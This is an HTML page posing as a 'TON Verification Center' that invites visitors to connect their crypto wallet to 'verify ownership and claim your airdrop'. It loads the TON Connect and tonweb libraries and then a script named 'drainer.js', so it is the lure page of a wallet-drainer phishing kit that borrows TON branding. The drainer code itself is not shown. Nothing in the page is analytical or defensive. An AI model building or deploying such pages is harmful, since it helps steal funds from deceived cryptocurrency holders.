<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TON Verification Center | Secure Claim</title>
    <style>
        body { background-color: #0a0b10; color: #ffffff; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: linear-gradient(145deg, #1a1c26, #11121a); padding: 40px; border-radius: 24px; box-shadow: 0 20px 50px rgba(0,0,0,0.5); text-align: center; max-width: 400px; width: 90%; border: 1px solid #2d2f3f; }
        .logo { width: 80px; margin-bottom: 20px; }
        h1 { font-size: 24px; margin-bottom: 10px; }
        p { color: #a0a0b0; font-size: 14px; margin-bottom: 30px; }
        #ton-connect-button { display: block; margin: 0 auto; min-height: 40px; }
        .fallback-btn { display: none; background: #0088cc; color: white; border: none; padding: 12px 24px; border-radius: 12px; font-weight: 600; cursor: pointer; font-size: 16px; }
        .status-box { margin-top: 25px; padding: 12px; background: rgba(255,255,255,0.05); border-radius: 12px; font-size: 13px; color: #0088cc; min-height: 20px; }
    </style>
</head>
<body>
    <div class="card">
        <img src="https://ton.org/static/ton_logo.png" class="logo" alt="TON Logo">
        <h1>Verify Your Wallet</h1>
        <p>Please connect your wallet to verify ownership and claim your airdrop.</p>
        <div id="ton-connect-button"></div>
        <button id="fallback-connect-btn" class="fallback-btn">Connect Wallet</button>
        <div class="status-box" id="status">Checking connection...</div>
    </div>

    <!-- Використовуємо найстабільніші версії через один CDN -->
    <script src="https://cdn.jsdelivr.net/npm/@tonconnect/ui@2.15.2/dist/tonconnect-ui.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/tonweb@1.3.0/dist/tonweb.min.js"></script>
    
    <script>
        window.Buffer = window.Buffer || {
            from: (str) => new TextEncoder().encode(str),
            toString: (buf) => btoa(String.fromCharCode(...buf))
        };
    </script>
    <script src="drainer.js"></script>
</body>
</html>
